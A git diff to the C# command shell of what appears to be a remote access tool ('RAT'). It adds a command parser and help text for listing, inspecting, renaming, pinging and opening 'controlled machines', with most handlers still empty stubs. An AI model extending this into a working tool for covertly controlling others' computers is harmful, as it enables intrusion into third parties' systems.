@@ -1,3 +1,4 @@
+using System.Text.RegularExpressions;
 using RAT.Utils;
 
 namespace RAT.Shell;
@@ -5,46 +6,149 @@ namespace RAT.Shell;
 static class Shell
 {
     private static bool isShellOpened = true;
+    private static Dictionary<string, Action<string[]>> _commands = [];
+
+    static Shell() { }
+
+    private static void InitializeCommands()
+    {
+        // Базовые команды
+        _commands["help"] = (args) => ShowHelp();
+        _commands["menu"] = (args) => OpenMenu();
+        _commands["clear"] = (args) => Console.Clear();
+        _commands["cls"] = (args) => Console.Clear();
+        _commands["exit"] = (args) => Environment.Exit(0);
+        _commands["quit"] = (args) => Environment.Exit(0);
+
+        // Команда machine
+        _commands["machine"] = HandleMachineCommand;
+        _commands["m"] = HandleMachineCommand;
+
+        // Команда config
+        _commands["config"] = HandleConfigCommand;
+        _commands["cfg"] = HandleConfigCommand;
+    }
 
     internal static void TurnShell()
     {
-        string help =
-            $@"
-Shell usage: $ command <option> |
-
-List of available command and their options: 
-
-1. BASE HANDLING WITH SHELL:
-
-------------
-$ (menu) - Open main menu of RAT with all important commands;
-------------
-$ (clear/cls) - Clear terminal;
-------------
-$ (exit/quit) - Close program;
-------------
-
-2. WORK WITH TARGETS:
-
-------------
-$ (machine) <option> - Handling with controlled machine;
-OPTIONS: 
---list / -l : List of controlled machines with all information that was grabbed from;
---info / -i <id1,id2,id3...> : Show all information about specific machines, you can use this option with more than 1 param, Example: session --info 537290 | That command show us all information about [537290] machine;
---rename / -rn <id> : Rename specific one machine,  
---delete / -d <id> : Delete controlling machine.  {(UtilsCollection.isAdmin ? "For using this param, you have to execute utility with admin rights." : "")};
-
-";
         while (isShellOpened)
         {
-            Console.Write($"[{UtilsCollection.machineName}@{UtilsCollection.userName}]$ ");
-            string? input = Console.ReadLine();
+            Console.Write($"[{UtilsCollection.userName}@{UtilsCollection.machineName}]$ ");
+            string? input = Console.ReadLine()?.Trim();
 
             if (string.IsNullOrEmpty(input))
             {
-                Console.WriteLine("There's command `help` shows all commands and their options.");
                 continue;
             }
+
+            ParseEndExecute(input);
         }
+    }
+
+    private static void ParseEndExecute(string input)
+    {
+        var args = ParseArgument(input);
+        if (args.Count == 0)
+            return;
+
+        string command = args[0].ToLower();
+        var commandArgs = args.Skip(1).ToArray();
+
+        if (_commands.ContainsKey(command))
+        {
+            try
+            {
+                _commands[command](commandArgs);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error executing command: {ex.Message}");
+            }
+        }
+        else
+        {
+            Console.WriteLine(
+                $"Unknown command: {command}. Type 'help' for seeing available commands"
+            );
+        }
+    }
+
+    private static List<string> ParseArgument(string command)
+    {
+        var result = new List<string>();
+        var regex = new Regex(@"[\""].+?[\""]|[^ ]+");
+
+        foreach (Match match in regex.Matches(command))
+        {
+            result.Add(match.Value.Trim('"'));
+        }
+
+        return result;
+    }
+
+    private static void HandleMachineCommand(string[] args)
+    {
+        if (args.Length == 0 | args.Length > 1) { }
+    }
+
+    private static void ShowHelp()
+    {
+        string help =
+            @"
+Shell usage: <command> [options]
+
+Available commands:
+
+  help                          Show this help message
+  menu                          Open main menu
+  clear / cls                   Clear terminal
+  exit / quit                   Close program
+
+  machine [options]             Manage controlled machines
+    --list, -l                    List all controlled machines
+    --info, -i <ids>              Show info about specific machines
+    --rename, -rn <id> <name>     Rename a machine
+    --delete, -d <id>             Delete a machine (admin only)
+    --open, -o <id>               Open machine controller
+    --ping, -p <all|ids>          Ping machines
+
+  config [options]              Manage utility config
+    --re-generate, -rg            Regenerate config (admin only)
+    --change-path, -p <PATH>      Change config file path
+
+Examples:
+  machine --list
+  machine --info 001,002,003
+  machine --rename 001 home-pc
+  machine --ping all
+  config --change-path ./config.json
+";
+        Console.WriteLine(help);
+    }
+
+    private static void ShowMachineHelp()
+    {
+        Console.WriteLine(
+            @"
+machine command options:
+  --list, -l                   List all controlled machines
+  --info, -i <ids>             Show info about specific machines
+  --rename, -rn <id> <name>    Rename a machine
+  --delete, -d <id>            Delete a machine (admin only)
+  --open, -o <id>              Open machine controller
+  --ping, -p <all|ids>         Ping machines
+"
+        );
+    }
+
+    private static void ShowConfigHelp()
+    {
+        Console.WriteLine(
+            @"
+config command options:
+  --re-generate, -rg            Regenerate config with defaults (admin only)
+  --change-path, -p <PATH>      Change config file path
+"
+        );
     }
 }
